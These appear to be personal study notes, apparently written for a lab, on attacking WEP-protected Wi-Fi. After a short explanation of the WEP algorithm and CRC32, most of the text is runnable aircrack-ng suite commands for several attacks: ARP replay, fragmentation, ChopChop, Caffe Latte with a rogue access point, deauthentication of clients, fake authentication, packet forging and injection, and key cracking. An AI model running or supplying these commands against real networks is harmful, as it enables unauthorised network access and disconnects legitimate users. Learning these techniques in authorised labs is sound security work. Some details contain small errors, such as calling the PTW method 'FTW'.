# WEP modes
WEP supports two types of authentication systems: Open and Shared.
- Open: a client does not provide any credentials when connecting to the access point.to encrypt and decrypt data frames, the client must have the correct key.
- Shared: a challenge text is sent to the client during the authentication process


# WEP Algorithm


```
                     _______________________________________________________________________
                    |                                                             |   IV    |   
Initialization      |    ____              ______                       _____     |         |
Vector (IV)    -----*-->|    | Seed 64bit | WEP  | Key Generated       | XOR |    |         |(24bits)                | ++ |----------->| PRNG |-------------------->| Enc |    |Cipher   |
Secret Key      ------->|____|            |______|                     | ryp |--->|Text     |
40or104 bits                                                           | tion|    |         |
Plaintext ------------------------------------------------------------>|_____|    |         |
                    |                                                             |  ICV    |
                    |____________________________________________________________ |_________|
                            (integrity algorith produces ICV) (32bits)          
```

The secret key is combined with an initialization vector (IV) and the resulting seed is input to a pseudo
random number generator (PRNG). The PRNG outputs a key sequence k of pseudo-random bits equal
in length to the largest possible MSDU. Two processes are applied to the plaintext MSDU. To protect
against unauthorized data modification, an integrity algorithm operates on P to produce an integrity check
value (ICV). Encipherment is then accomplished by mathematically combining the key sequence with P.
The output of the process is a message containing the resulting ciphertext, the IV, and the ICV

- initialization vector is randomly generated per packet

- The combined plaintext/checksum block is XORed with the RC4 keystream to produce the ciphertext


# CRC32 

[pycytpodome](https://pycryptodome.readthedocs.io/en/latest/src/introduction.html)

This algorithm is used for hashing the plaintext stream , producing its checksum.

```
import zlib


packetplaintext = b'Something Sensitive'

crc32 = zlib.crc32(packetplaintext)

print(crc32)
```


# Using Wireshark and aircrack-ng


### Find IntegrityCheckValue and InitializationVector

- List the available interfaces

` $ iwconfig`

- Enable monitor mode

`$ sudo airmon-ng start wlan0`

- Kill conflicts

`$ sudo airmon-ng check kill`

- Start monitoring and check for WEP Ciphers

`$ sudo airodump-ng wlan0mon`

- Focus the monitoring on this specific wifi with its bssid and its channel

` $ sudo airodump-ng -c {chnl_id} --bssid {bssid} wlan0mon -w WEP`

- At any point you`ve captured enough packets stop monitoring and open the capture file in Wireshark

- Go to IEEE 802.11 Data' - > 'WEP Parameters'


# ARP Request Replay Attack

- Listen for an arp reuest by the access point

- Capture it and retransmit it

- AP will respond to it every time with a new IV

- Collect the IV`s

- crack the WEP key using either the Korek/FMS attack or the default PTW attack


#### Enable monitor

`$ sudo airmon-ng start wlan0`

#### Check it again

`$ iwconfig`

#### Monitor for the reuest

`$ airodump-ng wlan0mon -c 1 -w {file_prefix}`

- If multiple AP`s are working on -c 1 channel , specify the bssid

#### Replay an ARP Request

- From a different terminal while airodump is running

- -h could be spoofed as well , but ITS A ALREADY Authenticated client
    - Get this mac by inpecting airodump in the other terminal and pick a valid client

- -b is the bssid of the AP

`$ sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon`

#### Crack the WEP key

`$ aircrack-ng -b XX:XX... capfile.cap`

- Default method is FTW
    - reuires 20k IV`s for 64-bit keys
    - requires 40k for 128-bit
- append -k to use Korek/FMS
    - needs over 120k IV`s




# Fragmentation Attack 


#### Enable monitor mode

`$ sudo airmon-ng start wlan0`

#### Capture packets

`$ airodump-ng wlan0mon -c 1 -w WEP`

#### Perform the attack

`$ sudo aireplay-ng -5 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon`


- It will output the xor key to a file

#### Analyze the dump

`$ tcpdump -s 0 -n -e -r replay_src-0805-191842.cap`

- Extract :
    - The Source IP address
    - The Dest IP address
    - The Source MAC address
    - The Dest MAC address


#### Forge an ARP request using packetforge-ng

`$ packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y fragment-0805-191851.xor -w forgedarp.cap`

- -a is AP`s MAC address
- -h is clients MAC
- -k is AP`s IP address (could be broadcast)
- -l is Clients IP address (could be broadcast)
- -y is the xor key file
- the packet will be outputed to -w


#### Inject it with Interactive Packet Replay to capture IV`s

`$ aireplay-ng -2 -r forgedarp.cap -h 42:E9:11:39:88:AE wlan0mon`

- -h is the client MAC
- airodump-ng is capturing this whole time
- Could also perform an arp replay attack now to generate more IV`secret

` $ sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon`

#### Crack the WEP key

`$ aircrack-ng -b A2:BD:32:EB:21:15 WEP-01.cap`


# Chop Chop

#### Enable monitor mode

`$ sudo airmon-ng start wlan0`

#### Monitor the network

`$ airodump-ng wlan0mon -c 1 -w WEP`

#### Launch the attack 

`$ aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon`

- This recreates the xor key 1 byte at a time.

- Dumps it to .xor file and also output the .cap file with the packets involved.

#### Analyze the dump

`$ tcpdump -s 0 -n -e -r replay_file.cap`

- Get the MAC and IP`s like before

#### Forge an ARP Request to get the IV`s

` $ packetforge-ng -0 -a C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-0805-221220.xor -w forgedarp.cap`


#### Initiate an Interactive Packet Replay Attack

`$ aireplay-ng -2 -r forgedarp.cap -h 7E:8D:FC:DD:D7:2C wlan0mon`

#### Initiate an ARP Replay to gain more IV`s

`$ aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon`


#### Crack the WEP key

`$ aircrack-ng -b C8:D1:4D:EA:21:A6 WEP-01.cap `


# Caffe Latte Attack 

[link](https://www.aircrack-ng.org/doku.php?id=cafe-latte)

#### Enter Monitor mode 

` $sudo airmon-ng start wlan0`

#### Monitor the network

`$ sudo  airodump-ng wlan0mon -c 1 -w WEP`

#### Launch the Caffe Latte Attack

`$ sudo aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon`

#### launch a fake access point in a third terminal

- ESSID and BSSID of this access point must match those of the target network

- -L to initiate the Cafe Latte attack mode
- -W 1 to enable WEP mode

`$sudo airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "ESSid" wlan0mon -W 1 -L`

#### Deauthenticate  the AP

`$ aireplay-ng -0 10 -a B2:D1:AC:E1:21:D1 -c B6:1F:98:CB:10:78  wlan0mon`

#### Crack the WEP key

`$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap`

# Fake authentication Attack


#### Monitor the network 

`$ sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP`

#### Begin the authentication with your MAC

`$ aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon`

- specify fake authentication with -1
- the re-association interval with 1000
- specify ESSID of the network with -e
- the BSSID with -a 
- your MAC address with -h
- the keep-alive request interval with -q
- use -o 1 to send only one set of packets at a time


- You can make a fake user authenticate with an OPEN type authentication to the AP if you cant associate it with a real client.

`$ aireplay-ng --fakeauth 0 -a 'TA:RG:ET:BS:SI:DD' wlan0mon`

- Doesnt work in shared key AP`s


#### Initiate a chop chop attack aswell

`$ aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon`

- This outputs the XOR key in a .xor file

#### Forge a ARP Request packet

`$ packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k ap_ip -l client_ip -y key.xor -w darp.cap`

#### Inject it to network

`$ aireplay-ng -2 -r forgedarp.cap wlan0mon`

#### start an ARP Replay attack

`$ sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon`

